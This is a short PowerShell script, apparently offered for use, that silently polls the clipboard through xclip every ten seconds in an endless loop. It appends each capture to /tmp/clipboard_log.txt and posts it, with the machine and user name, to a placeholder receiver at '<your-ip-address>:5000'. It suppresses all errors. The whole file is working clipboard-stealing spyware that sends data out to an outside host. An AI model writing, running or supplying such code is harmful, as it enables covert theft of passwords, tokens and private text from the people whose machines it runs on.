$webhook_url = "http://<your-ip-address>:5000/clipboard_receiver"

function Get-Clipboard {
    try {
        return & xclip -o 2>$null
    } catch {
        return $null
    }
}

$logFile = "/tmp/clipboard_log.txt"

while ($true) {
    $clipText = Get-Clipboard

    if ($clipText) {
        Add-Content -Path $logFile -Value "Clipboard: $clipText"

        $postParams = @{
            clipboard_data = $clipText
            machine_name   = $env:COMPUTERNAME
            user_name      = $env:USERNAME
        }

        try {
            Invoke-RestMethod -Uri $webhook_url -Method Post -Body $postParams
        } catch {}
    }

    Start-Sleep -Seconds 10
}
